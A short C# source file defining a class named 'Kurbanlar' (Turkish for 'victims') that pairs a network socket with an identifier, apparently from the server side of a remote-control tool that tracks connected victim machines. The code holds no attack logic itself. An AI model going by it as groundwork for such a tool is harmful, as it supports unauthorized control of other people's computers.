using System.Net.Sockets;
namespace SV
{
    public class Kurbanlar
    {
        public Socket soket;
        public string id;
        public Kurbanlar(Socket s, string ident)
        {
            soket = s;
            id = ident;
        }
    }
}
